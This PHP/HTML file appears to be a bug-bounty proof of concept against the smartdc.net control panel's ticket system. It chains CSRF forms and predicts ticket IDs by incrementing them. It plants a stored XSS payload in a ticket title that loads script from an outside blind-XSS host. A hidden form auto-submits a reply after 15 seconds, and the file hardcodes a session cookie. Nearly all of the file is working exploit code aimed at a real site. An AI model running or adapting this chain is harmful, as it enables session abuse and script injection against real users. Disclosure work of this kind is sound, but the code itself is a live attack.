<?php
session_start();

function generateRandomTicketTitle() {
    $length = 10;
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';

    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }

    return $randomString;
}
$titil = "Intigriti" . generateRandomTicketTitle() . PHP_EOL;
echo $titil;
function sendAdminTicket($cookie, $userAgent, $titil) {
    $postFields = http_build_query([
        'tokenname' => '',
        'token' => '',
        'categoryId' => '13',
        'ticketTitle' => $titil,
        'addReply' => '1',
        'ticketAttachmentHash' => '',
        'ticketContentValue' => 'abc',
        'qqfile' => '',
        'createLocation' => '/controlpanel/administration/tickets/create.php',
        'threadId' => ''
    ]);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.smartdc.net/controlpanel/administration/tickets/create.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Cookie: $cookie",
        "User-Agent: $userAgent",
        "Content-Type: application/x-www-form-urlencoded"
    ]);
    
    $response = curl_exec($ch);
    echo "Full Request:<br>";
    echo "<pre>";
    echo "POST /controlpanel/administration/tickets/create.php HTTP/2\n";
    echo "Host: www.smartdc.net\n";
    echo "User-Agent: $userAgent\n";
    echo "Content-Type: application/x-www-form-urlencoded\n";
    echo "Content-Length: " . strlen($postFields) . "\n";
    echo "Cookie: $cookie\n\n";
    echo $postFields;
    echo "</pre><br>";
        // Print the full response
        echo "Full Response:<br><pre>" . htmlspecialchars($response) . "</pre><br>";
    
    if (preg_match('/location: \/controlpanel\/administration\/tickets\/T-(\d+)-[A-Z0-9]{4}/i', $response, $matches)) {
        $ticketId = $matches[1];
        return $ticketId;
    } else {
        return null;
    }
    
    curl_close($ch);
}

$admin_cookie = "smartdc_net=20eta1pr3pmpd8a7kfoq3sb754; _gat=1"; // Change it with your own cookie if needed.
$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36";


if (!isset($_SESSION['ticketid1'])) {
    $_SESSION['ticketid1'] = sendAdminTicket($admin_cookie, $userAgent, $titil);
    echo '<h1>Pre-Satisfied User Has Sent A Ticket via PHP With id ' . $_SESSION['ticketid1'] . '</h1>';
    displayUserForm($titil);
        $newTicketId = $_SESSION['ticketid1'] + 4;
        echo '<div id="autoSubmitDiv" style="display:none">
              <form id="autoSubmitForm" action="https://www.smartdc.net/controlpanel/administration/tickets/T-' . $newTicketId . '-ABCD" method="POST">
                <input type="hidden" name="tokenname" value="" />
                <input type="hidden" name="token" value="" />
                <input type="hidden" name="addReply" value="1" />
                <input type="hidden" name="ticketAttachmentHash" value="" />
                <input type="hidden" name="ticketTitle" value="" />
                <input type="hidden" name="ticketContentValue" value="reply to ticket211" />
                <input type="hidden" name="qqfile" value="" />
              </form>
              </div>';
              echo 'Pre-Given User\'s ticket ID is increased with "+4"';
              echo '<h1>The Ticket ID of Victim User will Be ' . $newTicketId . '</h1>';
              echo '<h2><font color="red">Now a NEW TAB will be opened with a CSRF, open a ticket, then current tab will be exploited with an other CSRF and put comment on ticket.</font></h1>';
      
              
    }




function displayUserForm() {
    $titil = "Intigriti" . generateRandomTicketTitle() . PHP_EOL;
    echo '<form action="https://www.smartdc.net/controlpanel/administration/tickets/create.php" method="POST" target="_blank" onsubmit="return delayExecution();">
            <input type="hidden" name="tokenname" value="" />
            <input name="token" value="" />
            <input name="categoryId" value="13" />
            <input name="ticketTitle" value="<script src=https://bozx.bxss.in></script><h1>Bozx" />
            <input name="addReply" value="1" />
            <input name="ticketAttachmentHash" value="" />
            <input name="ticketContentValue" value="Abcabc" />
            <input name="qqfile" value="" />
            <input name="createLocation" value="/controlpanel/administration/tickets/create.php" />
            <input name="threadId" value="" />
            <input type="submit" value="Submit request" />
        </form>';
}


?>
<script>
    document.addEventListener('DOMContentLoaded', function() {
        // Display autoSubmitDiv after 15 seconds (10000 milliseconds) and submit the form inside it.
        setTimeout(function() {
            const autoSubmitDiv = document.getElementById('autoSubmitDiv');
            autoSubmitDiv.style.display = 'block';
            const autoSubmitForm = document.getElementById('autoSubmitForm');
            autoSubmitForm.submit();
        }, 15000);
    });
</script>
